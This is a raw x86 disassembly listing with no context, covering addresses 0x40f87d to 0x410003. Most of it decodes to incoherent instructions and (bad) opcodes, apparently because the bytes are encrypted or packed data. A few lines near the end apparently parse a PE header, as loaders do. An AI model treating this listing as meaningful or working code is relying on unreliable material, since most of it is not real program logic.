  40f87d:	xchg   edx,eax
  40f87e:	aad    0x79
  40f880:	js     0x40f8fb
  40f882:	int3   
  40f883:	gs jo  0x40f811
  40f886:	in     al,0x76
  40f888:	xchg   dl,ah
  40f88a:	jne    0x40f8f1
  40f88c:	dec    eax
  40f88d:	iret   
  40f88e:	imul   ecx,DWORD PTR [esi],0xc
  40f891:	les    esp,FWORD PTR ds:0xcb5d4f70
  40f897:	push   ebp
  40f898:	jg     0x40f896
  40f89a:	fld    QWORD PTR [esi]
  40f89c:	and    DWORD PTR [edi],esi
  40f89e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f89f:	mov    eax,ds:0xe6ac8732
  40f8a4:	cdq    
  40f8a5:	cld    
  40f8a6:	js     0x40f860
  40f8a8:	in     al,dx
  40f8a9:	imul   edi,esp,0xb819e176
  40f8af:	push   esi
  40f8b0:	and    DWORD PTR [edi],ecx
  40f8b2:	ins    DWORD PTR es:[edi],dx
  40f8b3:	fcmovnu st,st(5)
  40f8b5:	sub    BYTE PTR [edi+0x21],bl
  40f8b8:	gs xchg esi,eax
  40f8ba:	jg     0x40f89a
  40f8bc:	adc    eax,0x8257471a
  40f8c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8c2:	test   eax,0xb93c23f7
  40f8c7:	mov    dl,0x50
  40f8c9:	aaa    
  40f8ca:	or     ecx,DWORD PTR [edx]
  40f8cc:	xor    DWORD PTR [edx+0x40f7a4c1],edx
  40f8d2:	inc    edi
  40f8d3:	xor    eax,0x4c6f6e88
  40f8d8:	or     al,0xb5
  40f8da:	jnp    0x40f937
  40f8dc:	loopne 0x40f890
  40f8de:	mov    cs,WORD PTR ds:0xc0ec61b2
  40f8e4:	push   edx
  40f8e5:	call   0x280dd4a5
  40f8ea:	lods   al,BYTE PTR ds:[esi]
  40f8eb:	jg     0x40f8e5
  40f8ed:	dec    edi
  40f8ee:	call   0x9ef9:0x1f1ba0e5
  40f8f5:	pushf  
  40f8f6:	xchg   esp,eax
  40f8f7:	xchg   DWORD PTR [eax+0x37],edx
  40f8fa:	and    eax,0xfa6def32
  40f8ff:	sub    al,BYTE PTR [ebp+0xdcec275]
  40f905:	jg     0x40f8c5
  40f907:	into   
  40f908:	daa    
  40f909:	mov    bh,0x60
  40f90b:	dec    ebx
  40f90c:	xlat   BYTE PTR ds:[ebx]
  40f90d:	and    DWORD PTR [ebx+0x5e],ecx
  40f910:	jp     0x40f92f
  40f912:	ja     0x40f8c6
  40f914:	ds retf 
  40f916:	mov    cl,0xb3
  40f918:	or     al,0x2a
  40f91a:	mov    ebx,0x5306344c
  40f91f:	jmp    0x40f972
  40f921:	dec    ecx
  40f922:	adc    esi,DWORD PTR [edi-0x31]
  40f925:	xor    DWORD PTR [bp+di],eax
  40f928:	cld    
  40f929:	loopne 0x40f908
  40f92b:	inc    ecx
  40f92c:	dec    ebx
  40f92d:	xor    eax,0x5fbe407f
  40f932:	add    eax,0x1d8585ab
  40f937:	or     bh,bl
  40f939:	add    ch,BYTE PTR [edx-0x3f]
  40f93c:	fisub  DWORD PTR [eax-0x1e0a536]
  40f942:	fwait
  40f943:	sub    BYTE PTR [ebp+0x2c1fda63],dl
  40f949:	ret    
  40f94a:	dec    edi
  40f94b:	fwait
  40f94c:	sbb    BYTE PTR [edi+eax*4-0x1fdcaec2],bh
  40f953:	ds dec ecx
  40f955:	sbb    DWORD PTR [ebx],ecx
  40f957:	jmp    0x9add:0xe2b4c763
  40f95e:	ror    BYTE PTR [ebx-0x29],cl
  40f961:	jnp    0x40f938
  40f963:	cld    
  40f964:	fdiv   st(0),st
  40f966:	jl     0x40f986
  40f968:	daa    
  40f969:	pop    ebp
  40f96a:	in     eax,0xde
  40f96c:	into   
  40f96d:	stos   DWORD PTR es:[edi],eax
  40f96e:	aas    
  40f96f:	or     ch,BYTE PTR [ebx]
  40f971:	pop    es
  40f972:	inc    ebp
  40f973:	sub    eax,0x767b20ae
  40f978:	data16 mov cl,BYTE PTR [edi-0x7f]
  40f97c:	retf   0xa11a
  40f97f:	jne    0x40f98d
  40f981:	inc    edi
  40f982:	mov    cs,edx
  40f984:	xor    BYTE PTR [edx],0x8c
  40f987:	sub    eax,0xf1c9e0b6
  40f98c:	mov    eax,ds:0xe1bf09ca
  40f991:	pop    edx
  40f992:	imul   ebx,DWORD PTR [ebp+0x1d],0x9fbc2c2d
  40f999:	xor    BYTE PTR [edi-0x263401fc],cl
  40f99f:	and    dl,BYTE PTR [ebx-0x29]
  40f9a2:	push   ds
  40f9a3:	add    ch,BYTE PTR [ecx-0x5d]
  40f9a6:	scas   al,BYTE PTR es:[edi]
  40f9a7:	pop    ebp
  40f9a8:	fwait
  40f9a9:	xlat   BYTE PTR ds:[ebx]
  40f9aa:	or     DWORD PTR [eax],ebp
  40f9ac:	aas    
  40f9ad:	or     eax,0x85164ec5
  40f9b2:	jns    0x40fa10
  40f9b4:	mov    ds:0x53e8fdc9,eax
  40f9b9:	loope  0x40f9b1
  40f9bb:	in     al,dx
  40f9bc:	loope  0x40f9d6
  40f9be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9bf:	sbb    eax,0x9c2dfd84
  40f9c4:	xchg   esi,eax
  40f9c5:	(bad)  
  40f9c7:	adc    al,0xcb
  40f9c9:	sbb    DWORD PTR cs:[ecx+0x1630037d],0xffffffdc
  40f9d1:	gs push ebp
  40f9d3:	or     eax,0x9c688be0
  40f9d8:	xchg   edx,eax
  40f9d9:	mov    ebp,0x57759b5d
  40f9de:	clc    
  40f9df:	xor    eax,0xdcfa454d
  40f9e4:	aam    0x40
  40f9e6:	ins    DWORD PTR es:[edi],dx
  40f9e7:	jne    0x40f99c
  40f9e9:	jae    0x40f993
  40f9eb:	xor    BYTE PTR [edi+0x8],al
  40f9ee:	or     BYTE PTR [ebx],cl
  40f9f0:	jle    0x40fa2e
  40f9f2:	sub    dh,BYTE PTR [edx+0x56e51e24]
  40f9f8:	not    BYTE PTR [edi]
  40f9fa:	das    
  40f9fb:	pop    edi
  40f9fc:	mov    ebx,0x1e05ba5a
  40fa01:	(bad)  
  40fa02:	cld    
  40fa03:	mov    ds:0xe5ad3b8a,eax
  40fa08:	mov    esi,0x79268370
  40fa0d:	dec    edi
  40fa0e:	(bad)  
  40fa10:	enter  0x9e02,0x99
  40fa14:	pop    eax
  40fa15:	sub    DWORD PTR [eax],ebx
  40fa17:	or     bl,BYTE PTR [ebp+0x10cc977c]
  40fa1d:	dec    edx
  40fa1e:	stos   BYTE PTR es:[edi],al
  40fa1f:	dec    edx
  40fa20:	mov    edx,0xd89a8657
  40fa25:	mov    dl,0xbc
  40fa27:	es pop edi
  40fa29:	cmp    ah,BYTE PTR [eax+0x76aa986e]
  40fa2f:	mov    ecx,0x4ef407ee
  40fa34:	cli    
  40fa35:	cmp    al,0xa6
  40fa37:	out    0xcc,eax
  40fa39:	cmc    
  40fa3a:	mov    ecx,0x95d5f5c7
  40fa3f:	dec    ebp
  40fa40:	les    ecx,FWORD PTR [edx+0x26c24034]
  40fa46:	mov    ch,0x4d
  40fa48:	mov    eax,ds:0xe9da1f2
  40fa4d:	stos   DWORD PTR es:[edi],eax
  40fa4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa4f:	push   esi
  40fa50:	test   eax,0x34806297
  40fa55:	jne    0x40fabf
  40fa57:	fwait
  40fa58:	out    0x3a,eax
  40fa5a:	push   es
  40fa5b:	sbb    eax,0xee183448
  40fa60:	in     al,0x4f
  40fa62:	add    eax,0xf735cdf5
  40fa67:	inc    edi
  40fa68:	in     al,dx
  40fa69:	xchg   ebp,eax
  40fa6a:	lods   al,BYTE PTR ds:[esi]
  40fa6b:	jb     0x40fa4b
  40fa6d:	outs   dx,DWORD PTR fs:[esi]
  40fa6f:	imul   ebx,DWORD PTR [ebp+0x3dada582],0x27
  40fa76:	xor    DWORD PTR [ecx],0x7e30c48f
  40fa7c:	and    eax,0xb67f4d34
  40fa81:	popa   
  40fa82:	or     DWORD PTR [edi-0x1],ecx
  40fa85:	jnp    0x40fa74
  40fa87:	or     DWORD PTR [eax-0x1f],ebx
  40fa8a:	aam    0x62
  40fa8c:	mov    ch,0xe5
  40fa8e:	push   ecx
  40fa8f:	sbb    DWORD PTR ss:[edi],edi
  40fa92:	je     0x40fad5
  40fa94:	call   0xae77daa6
  40fa99:	cli    
  40fa9a:	mov    BYTE PTR [ecx+ebx*1+0x7263f8bb],al
  40faa1:	outs   dx,DWORD PTR ds:[esi]
  40faa2:	xor    al,0x44
  40faa4:	ret    0x7535
  40faa7:	pop    DWORD PTR [edi+eiz*2]
  40faaa:	stos   BYTE PTR es:[edi],al
  40faab:	push   ss
  40faac:	xor    al,0x8e
  40faae:	aas    
  40faaf:	sub    al,0xe8
  40fab1:	ds add bl,cl
  40fab4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fab5:	push   eax
  40fab6:	or     BYTE PTR [esi+0x30],dh
  40fab9:	sbb    edx,DWORD PTR [eax+0x5e]
  40fabc:	mov    ch,0xdb
  40fabe:	jnp    0x40fac9
  40fac0:	xor    ch,BYTE PTR [ebx+0x2b]
  40fac3:	es jg  0x40faaa
  40fac6:	cmp    eax,0x43610210
  40facb:	add    al,0xd
  40facd:	aad    0xc2
  40facf:	int    0x20
  40fad1:	mov    BYTE PTR [ebx-0x77a2f707],0x66
  40fad8:	push   esp
  40fad9:	lds    esi,FWORD PTR [ecx]
  40fadb:	stc    
  40fadc:	cdq    
  40fadd:	cmp    esi,DWORD PTR [eax]
  40fadf:	mov    esp,0x3c7291dd
  40fae4:	mov    dl,bl
  40fae6:	ja     0x40fa70
  40fae8:	iret   
  40fae9:	ret    0x2bb4
  40faec:	pop    ebx
  40faed:	jae    0x40fadc
  40faef:	loopne 0x40faa3
  40faf1:	shr    BYTE PTR [ebx+0xa],1
  40faf4:	adc    al,0x35
  40faf6:	lahf   
  40faf7:	adc    al,0x5b
  40faf9:	into   
  40fafa:	popa   
  40fafb:	std    
  40fafc:	pop    ss
  40fafd:	xchg   BYTE PTR [ebp-0x21],dh
  40fb00:	cwde   
  40fb01:	add    eax,eax
  40fb03:	xchg   esp,eax
  40fb04:	jge    0x40fac1
  40fb06:	enter  0x6bb4,0xee
  40fb0a:	cmp    esp,eax
  40fb0c:	lock ins BYTE PTR es:[edi],dx
  40fb0e:	pop    ds
  40fb0f:	ins    BYTE PTR es:[edi],dx
  40fb10:	mov    ds:0x96cfc4a6,eax
  40fb15:	or     al,0xde
  40fb17:	adc    bh,al
  40fb19:	enter  0x9353,0x49
  40fb1d:	loop   0x40fb7c
  40fb1f:	xchg   ebp,eax
  40fb20:	xchg   ecx,eax
  40fb21:	mov    bl,BYTE PTR [ebx]
  40fb23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb24:	pop    ecx
  40fb25:	inc    eax
  40fb26:	xor    ebp,eax
  40fb28:	pop    ebx
  40fb29:	in     eax,0xb3
  40fb2b:	mov    esp,0x7ebd183a
  40fb30:	jge    0x40fadd
  40fb32:	push   edi
  40fb33:	outs   dx,DWORD PTR ds:[esi]
  40fb34:	or     al,0xfb
  40fb36:	lahf   
  40fb37:	jmp    0x40fb4c
  40fb39:	pop    ss
  40fb3a:	push   esi
  40fb3b:	push   edi
  40fb3c:	shl    DWORD PTR [ebx],cl
  40fb3e:	add    bl,BYTE PTR [eax+0x6d]
  40fb41:	mov    eax,0x5763a499
  40fb46:	and    al,0x5d
  40fb48:	sbb    bh,BYTE PTR [edx]
  40fb4a:	popf   
  40fb4b:	inc    edx
  40fb4c:	ja     0x40fad9
  40fb4e:	sub    eax,DWORD PTR [esi+ebx*4]
  40fb51:	jge    0x40faf3
  40fb53:	jbe    0x40fb15
  40fb55:	push   esi
  40fb56:	(bad)  
  40fb57:	jae    0x40fb53
  40fb59:	in     al,dx
  40fb5a:	xchg   BYTE PTR [ecx+0x56],bl
  40fb5d:	lock add ebp,DWORD PTR [ebx-0x61a77960]
  40fb64:	call   0x17cf6336
  40fb69:	icebp  
  40fb6a:	out    dx,al
  40fb6b:	fisub  DWORD PTR [edi+edx*1-0x10]
  40fb6f:	push   ds
  40fb70:	jns    0x40fbd1
  40fb72:	xchg   DWORD PTR [esp+eax*1-0x144534bb],edi
  40fb79:	push   edx
  40fb7a:	or     BYTE PTR [eax],al
  40fb7c:	outs   dx,DWORD PTR ds:[esi]
  40fb7d:	xchg   esi,eax
  40fb7e:	xor    ebx,edx
  40fb80:	sbb    ah,BYTE PTR [esp+ebx*8+0x2]
  40fb84:	add    al,0x2
  40fb86:	mov    gs,WORD PTR [edi]
  40fb88:	pusha  
  40fb89:	fstp   TBYTE PTR ds:0x54c63e9e
  40fb8f:	call   0x696048
  40fb94:	in     eax,dx
  40fb95:	sti    
  40fb96:	xor    al,0xb
  40fb98:	ja     0x40fb3b
  40fb9a:	push   ecx
  40fb9b:	neg    DWORD PTR ds:0x42e124
  40fba1:	jmp    0x40ff6b
  40fba6:	mov    ebp,ecx
  40fba8:	cli    
  40fba9:	xor    DWORD PTR [edx-0x648a4e8f],edi
  40fbaf:	test   BYTE PTR [ebp-0x51],0x53
  40fbb3:	mov    edi,0xb182afda
  40fbb8:	jo     0x40fc2a
  40fbba:	mov    ds:0x7270707d,eax
  40fbbf:	xor    al,0x3f
  40fbc1:	push   ebp
  40fbc2:	sti    
  40fbc3:	mov    dl,0x30
  40fbc5:	stos   DWORD PTR es:[edi],eax
  40fbc6:	jbe    0x40fb77
  40fbc8:	(bad)  
  40fbc9:	fisttp DWORD PTR [edx+0x18]
  40fbcc:	sub    al,0xb7
  40fbce:	pop    esp
  40fbcf:	mov    ecx,0x3d264663
  40fbd4:	fistp  WORD PTR [edx-0x5e6a1b4d]
  40fbda:	cmp    ecx,DWORD PTR [ebx-0x1f]
  40fbdd:	inc    edi
  40fbde:	push   edx
  40fbdf:	xchg   ebx,eax
  40fbe0:	mov    ebp,0x8d37d62c
  40fbe5:	push   ebx
  40fbe6:	adc    esp,DWORD PTR [eax+0x676aa7a8]
  40fbec:	jnp    0x40fb85
  40fbee:	or     DWORD PTR [ecx+0x22],edx
  40fbf1:	mov    edx,0xcfd45577
  40fbf6:	int    0xff
  40fbf8:	adc    edx,DWORD PTR [edx+0x63]
  40fbfb:	clc    
  40fbfc:	les    eax,FWORD PTR [ecx]
  40fbfe:	int    0x2b
  40fc00:	dec    esp
  40fc01:	adc    ebx,DWORD PTR [edx+0x2edcf5d2]
  40fc07:	xchg   ebx,eax
  40fc08:	js     0x40fc06
  40fc0a:	jns    0x40fc09
  40fc0c:	sub    BYTE PTR [ebx],dl
  40fc0e:	imul   ebx,edx,0xd7bebc96
  40fc14:	rol    DWORD PTR [ecx],0x56
  40fc17:	outs   dx,DWORD PTR ds:[esi]
  40fc18:	mov    al,ds:0x9a081b8a
  40fc1d:	adc    DWORD PTR [esi-0x3c6e8d26],ebp
  40fc23:	fisubr WORD PTR [ebp-0x27089c0f]
  40fc29:	push   0x9e1f477e
  40fc2e:	xchg   esi,eax
  40fc2f:	xchg   ecx,eax
  40fc30:	mov    dh,0xc4
  40fc32:	sbb    bh,dh
  40fc34:	xor    eax,0xf62dbdd1
  40fc39:	xor    edx,edx
  40fc3b:	pop    es
  40fc3c:	leave  
  40fc3d:	pusha  
  40fc3e:	push   eax
  40fc3f:	pop    esp
  40fc40:	hlt    
  40fc41:	retf   0x3619
  40fc44:	ret    0x255d
  40fc47:	je     0x40fbe5
  40fc49:	ins    BYTE PTR es:[edi],dx
  40fc4a:	xchg   edx,eax
  40fc4b:	(bad)  
  40fc4c:	loope  0x40fcb0
  40fc4e:	jmp    0x1f45:0x76c7f445
  40fc55:	out    dx,al
  40fc56:	or     cl,BYTE PTR [bx+si]
  40fc59:	sub    al,0x5e
  40fc5b:	arpl   bp,cx
  40fc5d:	cwde   
  40fc5e:	mov    eax,0x522920e9
  40fc63:	cs or  al,0xf3
  40fc66:	iret   
  40fc67:	cmp    bl,BYTE PTR [edi]
  40fc69:	loop   0x40fbee
  40fc6b:	stc    
  40fc6c:	add    DWORD PTR [edx],edx
  40fc6e:	das    
  40fc6f:	es dec edx
  40fc71:	test   dh,al
  40fc73:	add    eax,DWORD PTR [edx]
  40fc75:	jne    0x40fcc3
  40fc77:	sbb    BYTE PTR [ebp+0x17],bh
  40fc7a:	cmp    al,0xa0
  40fc7c:	cmp    DWORD PTR [eax-0x44d54e61],ebx
  40fc82:	cmp    eax,0x2d735c98
  40fc87:	push   ebx
  40fc88:	call   0xc583:0xece91df6
  40fc8f:	and    cl,BYTE PTR [eax]
  40fc91:	in     eax,0xfb
  40fc93:	mov    DWORD PTR [esp+eiz*2+0x28956a34],eax
  40fc9a:	mov    cl,0xd9
  40fc9c:	aaa    
  40fc9d:	jbe    0x40fc36
  40fc9f:	adc    al,0x20
  40fca1:	adc    DWORD PTR [ecx+ebx*8-0x61b91116],0x7dad9741
  40fcac:	add    ebp,ebp
  40fcae:	sbb    BYTE PTR [esi-0x3c51f5bf],0x38
  40fcb5:	mov    gs,WORD PTR ds:0x71e4e6d3
  40fcbb:	xor    al,BYTE PTR [edi+0x61]
  40fcbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fcbf:	cli    
  40fcc0:	imul   eax,DWORD PTR [eax-0xc8f3291],0xfd561b1f
  40fcca:	push   esp
  40fccb:	mov    ss,WORD PTR [edi+0x212850d4]
  40fcd1:	into   
  40fcd2:	cmp    BYTE PTR [ecx+0x1a],ch
  40fcd5:	pop    ds
  40fcd6:	(bad)  
  40fcd7:	mov    ds:0x499ad66d,eax
  40fcdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fcdd:	mov    ch,0xb1
  40fcdf:	cs cmp al,0xb4
  40fce2:	jno    0x40fc77
  40fce4:	cmp    DWORD PTR [edx-0x1],ebp
  40fce7:	nop
  40fce8:	xor    esp,DWORD PTR [ecx+0x3]
  40fceb:	mov    DWORD PTR [esi],eax
  40fced:	jbe    0x40fd6b
  40fcef:	mov    bl,0xcd
  40fcf1:	retf   0xb93
  40fcf4:	jecxz  0x40fd1d
  40fcf6:	out    dx,eax
  40fcf7:	push   ss
  40fcf8:	xchg   esi,eax
  40fcf9:	dec    ebp
  40fcfa:	pop    es
  40fcfb:	pop    edx
  40fcfc:	jmp    0x63cd:0x84532d66
  40fd03:	fwait
  40fd04:	jo     0x40fc9d
  40fd06:	push   es
  40fd07:	or     ah,BYTE PTR [esi]
  40fd09:	dec    ecx
  40fd0a:	mov    al,ds:0x19bd17aa
  40fd0f:	cmp    al,0x71
  40fd11:	ds aam 0xb0
  40fd14:	scas   eax,DWORD PTR es:[edi]
  40fd15:	inc    ebx
  40fd16:	mov    cl,0x2
  40fd18:	stc    
  40fd19:	ficom  WORD PTR [esi+0x2890f8ee]
  40fd1f:	cmp    DWORD PTR [edi+0xb],esp
  40fd22:	daa    
  40fd23:	int3   
  40fd24:	(bad)  
  40fd25:	cli    
  40fd26:	sahf   
  40fd27:	neg    bh
  40fd29:	cmp    eax,0x205dfdd
  40fd2e:	shr    BYTE PTR [esp+edi*2-0xd],0xfa
  40fd33:	lahf   
  40fd34:	aad    0x30
  40fd36:	and    eax,0xb4afb051
  40fd3b:	and    al,0xad
  40fd3d:	xchg   ebx,eax
  40fd3e:	popa   
  40fd3f:	out    0x66,eax
  40fd41:	or     eax,0xc6cd9b60
  40fd46:	imul   edx,DWORD PTR [esi-0x36],0xffffffc6
  40fd4a:	ret    0xb349
  40fd4d:	cmc    
  40fd4e:	or     BYTE PTR [ecx-0x2857e5ff],cl
  40fd54:	inc    edx
  40fd55:	mov    ah,0xb7
  40fd57:	arpl   WORD PTR [edx-0x31],cx
  40fd5a:	leave  
  40fd5b:	ret    
  40fd5c:	xor    BYTE PTR [ebp-0x52],cl
  40fd5f:	sub    ch,BYTE PTR [ebp-0x25]
  40fd62:	adc    eax,0xf851dab9
  40fd67:	rcr    DWORD PTR [ebp+0x37e7dd8a],0x2f
  40fd6e:	jecxz  0x40fde2
  40fd70:	mov    ebx,0xc94d9aaa
  40fd75:	(bad)  
  40fd77:	rcr    DWORD PTR [edx-0x46],0xbe
  40fd7b:	scas   al,BYTE PTR es:[edi]
  40fd7c:	jnp    0x40fd45
  40fd7e:	popf   
  40fd7f:	sbb    BYTE PTR [esi+ebx*8],al
  40fd82:	jecxz  0x40fd1b
  40fd84:	shl    DWORD PTR [eax-0x67],0xe
  40fd88:	sti    
  40fd89:	xlat   BYTE PTR ds:[ebx]
  40fd8a:	jne    0x40fd0e
  40fd8c:	retf   0x5579
  40fd8f:	mov    dh,0xd9
  40fd91:	sub    eax,0xe3e0b7a5
  40fd96:	(bad)  
  40fd98:	mov    ecx,0x39ad5b18
  40fd9d:	retf   
  40fd9e:	(bad)  
  40fd9f:	(bad)  
  40fda0:	push   ebx
  40fda1:	shl    ecx,cl
  40fda3:	int    0xfe
  40fda5:	cs (bad) 
  40fda7:	repnz out dx,eax
  40fda9:	shr    DWORD PTR [edx],cl
  40fdab:	pop    esp
  40fdac:	int    0xbf
  40fdae:	push   0x5faf726b
  40fdb3:	test   ebx,eax
  40fdb5:	jmp    0x75a801b0
  40fdba:	push   ebp
  40fdbb:	mov    eax,0x1b431c68
  40fdc0:	mov    edi,0x82bc8de2
  40fdc5:	(bad)  [edi+0x37f5efce]
  40fdcb:	push   eax
  40fdcc:	xor    bh,BYTE PTR [ebp-0x6704834f]
  40fdd2:	in     al,0x0
  40fdd4:	adc    eax,0x49a9068b
  40fdd9:	mov    dl,0x19
  40fddb:	xor    al,0x3e
  40fddd:	add    DWORD PTR [ecx],esi
  40fddf:	mov    dl,0x7f
  40fde1:	pop    ebp
  40fde2:	adc    eax,0x472c145a
  40fde7:	(bad)
  40fdea:	mov    ah,0x1a
  40fdec:	lea    edi,[edx+esi*8]
  40fdef:	je     0x40fe49
  40fdf1:	bound  edi,QWORD PTR [ecx]
  40fdf3:	dec    esi
  40fdf4:	dec    eax
  40fdf5:	int    0x95
  40fdf7:	in     al,0x15
  40fdf9:	int3   
  40fdfa:	fmul   DWORD PTR [ebp+ebx*1+0x352fc74e]
  40fe01:	mov    al,0x17
  40fe03:	mov    ah,0x7a
  40fe05:	sub    al,0x8e
  40fe07:	sbb    ch,BYTE PTR [ecx]
  40fe09:	xor    al,0xa8
  40fe0b:	mov    BYTE PTR [edx],al
  40fe0d:	push   eax
  40fe0e:	les    ebx,FWORD PTR [ebx]
  40fe10:	cwde   
  40fe11:	ins    DWORD PTR es:[edi],dx
  40fe12:	sbb    al,BYTE PTR [ebx]
  40fe14:	test   eax,0x37c91034
  40fe19:	(bad)  
  40fe1a:	(bad)  
  40fe1b:	push   ebx
  40fe1c:	(bad)  
  40fe1d:	mov    fs,WORD PTR [edi+0x39]
  40fe20:	test   esi,eax
  40fe22:	and    eax,0x7a73c7cd
  40fe27:	pushf  
  40fe28:	sbb    cl,dl
  40fe2a:	inc    ecx
  40fe2b:	iret   
  40fe2c:	inc    edi
  40fe2d:	mov    ebp,0x6c584fe4
  40fe32:	aas    
  40fe33:	cmp    DWORD PTR [eax-0x5672798c],edx
  40fe39:	adc    BYTE PTR [eax],0x5b
  40fe3c:	out    dx,al
  40fe3d:	add    al,0xd6
  40fe3f:	int    0xac
  40fe41:	int    0xcc
  40fe43:	cdq    
  40fe44:	int3   
  40fe45:	(bad)  
  40fe46:	imul   ebx,DWORD PTR [eax+0x4b5cde09],0x194c0560
  40fe50:	adc    eax,0xdb615337
  40fe55:	ds xchg ebp,eax
  40fe57:	inc    eax
  40fe58:	xchg   ebp,eax
  40fe59:	pop    ebp
  40fe5a:	push   edi
  40fe5b:	test   BYTE PTR [esi+0x73fd6498],ah
  40fe61:	imul   ebx,DWORD PTR [edx-0x26],0x21
  40fe65:	sbb    al,0x50
  40fe67:	das    
  40fe68:	cdq    
  40fe69:	and    al,0xb
  40fe6b:	popf   
  40fe6c:	adc    al,ch
  40fe6e:	loope  0x40fe62
  40fe70:	retf   0xd66
  40fe73:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40fe75:	add    al,0x37
  40fe77:	mov    ?,WORD PTR [ecx-0x247c587e]
  40fe7d:	dec    edi
  40fe7e:	cmp    al,0xdf
  40fe80:	xchg   ecx,eax
  40fe81:	mov    ds:0x99d1bbbf,al
  40fe86:	xchg   edi,eax
  40fe87:	mov    edx,0x543c0847
  40fe8c:	lods   al,BYTE PTR ds:[esi]
  40fe8d:	mov    esp,0x3f191ca9
  40fe92:	scas   eax,DWORD PTR es:[edi]
  40fe93:	jb     0x40fe20
  40fe95:	(bad)  
  40fe97:	sub    bl,BYTE PTR [esi]
  40fe99:	lahf   
  40fe9a:	popa   
  40fe9b:	xor    BYTE PTR [edx],al
  40fe9d:	imul   esp,DWORD PTR [ebp-0x6887bdd2],0x2983752b
  40fea7:	jb     0x40fe7b
  40fea9:	jno    0x40ff26
  40feab:	out    dx,eax
  40feac:	mov    ebp,0x9eb0fe04
  40feb1:	and    BYTE PTR [esi+edx*4],bh
  40feb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40feb5:	cmp    DWORD PTR [edi+0x11],esi
  40feb8:	mov    eax,ds:0xdeb3f613
  40febd:	add    ch,al
  40febf:	out    0xc5,eax
  40fec1:	popa   
  40fec2:	mov    bl,0x9d
  40fec4:	in     al,dx
  40fec5:	add    al,0x3a
  40fec7:	out    dx,eax
  40fec8:	iret   
  40fec9:	js     0x40fed0
  40fecb:	push   eax
  40fecc:	xchg   ebp,eax
  40fecd:	jg     0x40fe56
  40fecf:	(bad)  
  40fed1:	cmp    eax,0xee3bcf3
  40fed6:	dec    edx
  40fed7:	cmp    BYTE PTR [edi],bl
  40fed9:	mov    dl,0xec
  40fedb:	aaa    
  40fedc:	imul   ebp,DWORD PTR [edi+0x1],0x9df1c3e3
  40fee3:	jo     0x40fec8
  40fee5:	jmp    0xc6e6:0xd62226a4
  40feec:	adc    eax,0xd9f51907
  40fef1:	push   edx
  40fef2:	hlt    
  40fef3:	pop    ds
  40fef4:	cdq    
  40fef5:	jb     0x40ff1e
  40fef7:	scas   eax,DWORD PTR es:[edi]
  40fef8:	cmp    ah,BYTE PTR [ebx]
  40fefa:	mov    esp,0x8dc0bd1e
  40feff:	push   cs
  40ff00:	ins    DWORD PTR es:[edi],dx
  40ff01:	sub    BYTE PTR [esi],ch
  40ff03:	addr16 lahf 
  40ff05:	lea    edx,[eax]
  40ff07:	mov    esi,0x9614c498
  40ff0c:	mov    ds,WORD PTR [eax-0x4afb6977]
  40ff12:	shl    DWORD PTR [edi+0x56],0xd8
  40ff16:	mov    eax,ds:0x3ef8d7af
  40ff1b:	mov    edx,0xa8db5b78
  40ff20:	sub    DWORD PTR [ecx],ebp
  40ff22:	pop    ds
  40ff23:	test   eax,0xf77b1b15
  40ff28:	ror    esi,1
  40ff2a:	enter  0x6883,0xbf
  40ff2e:	(bad)  
  40ff2f:	fisub  DWORD PTR [ecx]
  40ff31:	test   BYTE PTR [ecx+0x263633ae],bl
  40ff37:	repz fld DWORD PTR [ecx]
  40ff3a:	xchg   DWORD PTR [ebx-0x3b],ebx
  40ff3d:	cmp    al,0x7
  40ff3f:	add    DWORD PTR [esi-0x6bfa0969],0xb204c71b
  40ff49:	push   esi
  40ff4a:	xor    BYTE PTR [ecx-0x4e3f1f7f],bh
  40ff50:	mov    esp,0x698e8656
  40ff55:	clc    
  40ff56:	scas   al,BYTE PTR es:[edi]
  40ff57:	(bad)  
  40ff59:	adc    dl,BYTE PTR [edx+0x16]
  40ff5c:	sub    eax,0x9e71bce0
  40ff61:	leave  
  40ff62:	sub    al,0x78
  40ff64:	mov    al,0x17
  40ff66:	sti    
  40ff67:	jmp    0xfc45:0xc7c54006
  40ff6e:	xor    DWORD PTR [ebp+0x458bf89c],eax
  40ff74:	or     BYTE PTR [edx+0x3405c700],cl
  40ff7a:	loope  0x40ffbe
  40ff7c:	add    BYTE PTR [edx],bh
  40ff7e:	cmp    al,BYTE PTR [eax]
  40ff80:	add    BYTE PTR [edi+esi*1],al
  40ff83:	xor    DWORD PTR ds:0x42e6f7,0x42fd7e
  40ff8d:	xor    al,0x47
  40ff8f:	mov    DWORD PTR ds:0x42fcd1,0x1793
  40ff99:	cmp    al,0xc3
  40ff9b:	jne    0x410b7f
  40ffa1:	mov    eax,DWORD PTR [ebp+0x8]
  40ffa4:	mov    edx,DWORD PTR ds:0x42fd76
  40ffaa:	and    edx,DWORD PTR ds:0x42e6fb
  40ffb0:	mov    DWORD PTR ds:0x42fd76,edx
  40ffb6:	mov    ecx,DWORD PTR [ebp+0x8]
  40ffb9:	mov    DWORD PTR ds:0x42e703,0x1299
  40ffc3:	add    ecx,DWORD PTR [eax+0x3c]
  40ffc6:	mov    edx,0x7510855
  40ffcb:	jmp    0x410395
  40ffd0:	fcmovnbe st,st(4)
  40ffd2:	aam    0xc8
  40ffd4:	repz enter 0xf3db,0x5c
  40ffd9:	push   edx
  40ffda:	jae    0x40fff5
  40ffdc:	sbb    BYTE PTR [ecx],0x1e
  40ffdf:	sbb    eax,0x7070bd35
  40ffe4:	mov    ds:0x6970707d,eax
  40ffe9:	push   edx
  40ffea:	out    dx,eax
  40ffeb:	jo     0x40ffa3
  40ffed:	or     esp,DWORD PTR [eax+0x57296146]
  40fff3:	dec    eax
  40fff4:	sub    DWORD PTR [edi],ecx
  40fff6:	inc    esp
  40fff7:	enter  0xa2f1,0xe
  40fffb:	and    DWORD PTR [edx-0x2c],0xfffffff5
  40ffff:	nop
  410000:	ins    BYTE PTR es:[edi],dx
  410001:	aad    0x59
  410003:	xchg   ebx,eax
